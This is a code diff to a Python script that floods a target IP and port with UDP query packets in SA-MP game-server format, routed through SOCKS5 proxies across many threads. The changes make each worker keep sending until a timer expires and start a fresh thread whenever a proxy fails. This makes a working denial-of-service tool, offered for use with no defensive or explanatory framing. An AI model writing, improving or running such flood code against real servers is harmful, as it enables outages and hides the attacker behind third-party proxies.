@@ -1,3 +1,4 @@
+
 import requests
 import threading
 import socket
@@ -48,7 +49,7 @@ print("████████████████████████�
 target_ip = sys.argv[1]
 target_port = int(sys.argv[2])
 times = int(sys.argv[3])
-threadtotal = int(sys.argv[4])
+totalthread = int(sys.argv[4])
 start_time = time.time()
 payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
 
@@ -58,7 +59,7 @@ def create_proxied_socket(proxy_host, proxy_port):
     s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
     s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
     return s
-
+    
 def worker():
     global blacklisted_proxies
     target = (target_ip, target_port)
@@ -67,17 +68,18 @@ def worker():
     proxy_port = int(proxy.split(":")[1])
     udp = create_proxied_socket(proxy_host, proxy_port)
 
-    if proxy not in blacklisted_proxies:
-        try:
-            udp.sendto(payload, target)
+    while time.time() - start_time < times:
+        if proxy not in blacklisted_proxies:
+            try:
+                udp.sendto(payload, target)
 
-        except Exception as error:
-            blacklisted_proxies.add(proxy)
+            except Exception as error:
+                blacklisted_proxies.add(proxy)
+                threading.Thread(target=worker).start()
+                break
     return
-    
-while threading.active_count() >= threadtotal:
-    pass
-threading.Thread(target=worker).start()
 
-while time.time() - start_time > times:
-     os._exit(0)
+while time.time() - start_time < times:
+    while threading.active_count() >= totalthread:
+        pass
+    threading.Thread(target=worker).start()
